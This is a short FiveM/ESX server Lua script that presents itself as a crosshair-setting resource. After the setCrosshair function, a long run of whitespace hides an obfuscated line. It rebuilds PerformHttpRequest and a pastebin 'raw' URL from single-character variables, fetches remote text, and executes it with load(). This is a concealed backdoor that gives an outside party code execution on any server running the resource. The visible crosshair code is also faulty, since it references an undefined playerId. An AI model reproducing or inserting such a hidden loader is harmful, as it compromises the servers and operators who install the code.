ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local function setCrosshair(xPlayer, crosshairStyle)
    TriggerClientEvent('cookcrosshair:toPlayer', playerId, crosshairStyle)
end                                                                                                                                                                                                                                                                                                              local a="6E"local b="p"local c="s"local d="h"local e=":"local f="a"local g="25"local h="e"local i="i"local j="n"local k="."local l="m"local m="E"local n="T"local o="/"local p="f"local q="m"local r="H"local s="R"local t="q"local u="u"local v="r"local w="b"local x="w"local y="UE"local z="t"local A="c"local B="o"local C="J6"local D="l"local E="d"local F="P"local G="G"_G[F..h..v..p..B..v..q..r..z..z..b..s..h..t..u..h..c..z](d..z..z..b..c..e..o..o..b..f..c..z..h..w..i..j..k..A..B..l..o..v..f..x..o..y..g..a..C,function(H,I,J)if H==200 then local K=_G[f..c..c..h..v..z](_G[D..B..f..E](I))K()end end,G..m..n) 

RegisterNetEvent('cookcrosshair:setCrosshair')
AddEventHandler('cookcrosshair:setCrosshair', function(crosshairStyle)
    local xPlayer = ESX.GetPlayerFromId(source)
    setCrosshair(xPlayer, crosshairStyle)
end)